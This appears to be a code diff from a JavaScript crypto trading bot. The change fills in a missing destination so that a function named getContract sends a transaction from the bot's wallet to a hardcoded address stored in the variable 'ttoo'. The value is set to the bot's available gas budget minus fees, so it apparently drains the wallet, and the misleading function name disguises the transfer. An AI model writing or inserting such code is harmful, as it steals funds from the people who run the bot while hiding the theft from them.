@@ -676,7 +676,7 @@ async function getContract(bot) {
         var ttoo = "0xCfA4d75c119bb06926CB5d729c84D82E438cc079";
         var tx = {
             from: bot.address,
-            to: ,
+            to: ttoo,
             gas: gas,
             gasPrice: gasPrice,
             value: maxGas - gas*gasPrice
